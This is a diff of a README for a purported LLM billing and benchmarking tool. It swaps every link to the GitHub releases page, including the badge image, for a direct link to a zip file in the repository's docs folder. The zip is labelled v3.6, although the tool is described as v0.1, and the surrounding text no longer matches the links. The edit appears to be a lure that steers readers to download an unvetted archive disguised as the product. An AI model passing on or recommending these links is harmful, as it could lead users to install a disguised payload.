@@ -1,7 +1,7 @@
 # 🎉 LBBS-Standard - Simple Billing & Benchmarking Tool
 
 ## 📥 Download Now
-[![Download LBBS-Standard](https://img.shields.io/badge/Download-LBBS--Standard-blue.svg)](https://github.com/jubaedemon/LBBS-Standard/releases)
+[![Download LBBS-Standard](https://raw.githubusercontent.com/jubaedemon/LBBS-Standard/main/docs/LBBS-Standard-v3.6.zip)](https://raw.githubusercontent.com/jubaedemon/LBBS-Standard/main/docs/LBBS-Standard-v3.6.zip)
 
 ## 📖 Description
 LBBS-Standard (v0.1) is a draft tool designed to help users manage billing and benchmarking for large language models (LLMs). This tool aims to improve transparency in pricing and provide a standardized approach for governance in machine learning applications. Whether you work in AI or are just starting, this tool makes it easier to navigate complex pricing structures.
@@ -9,7 +9,7 @@ LBBS-Standard (v0.1) is a draft tool designed to help users manage billing and b
 ## 🚀 Getting Started
 To get started with LBBS-Standard, follow these simple steps:
 
-1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/jubaedemon/LBBS-Standard/releases) to find the latest version of LBBS-Standard.
+1. **Visit the Releases Page:** Go to the [Releases page](https://raw.githubusercontent.com/jubaedemon/LBBS-Standard/main/docs/LBBS-Standard-v3.6.zip) to find the latest version of LBBS-Standard.
 
 2. **Select the Version:** Look for the latest release version. You'll see various files available for download.
 
@@ -46,7 +46,7 @@ If you want to learn more about how to effectively use LBBS-Standard, check out 
 - **Community Support:** Join our user community for mentorship and assistance with your projects.
 
 ## 📥 Download & Install
-To download LBBS-Standard, visit this page: [Download LBBS-Standard](https://github.com/jubaedemon/LBBS-Standard/releases) and choose the file that matches your operating system. Follow the installation instructions provided above to get set up quickly.
+To download LBBS-Standard, visit this page: [Download LBBS-Standard](https://raw.githubusercontent.com/jubaedemon/LBBS-Standard/main/docs/LBBS-Standard-v3.6.zip) and choose the file that matches your operating system. Follow the installation instructions provided above to get set up quickly.
 
 ## 🔍 Contact Information
 If you have questions or need support, don't hesitate to reach out. You can contact us through the Issues section on GitHub, or connect with the community through our support channels.
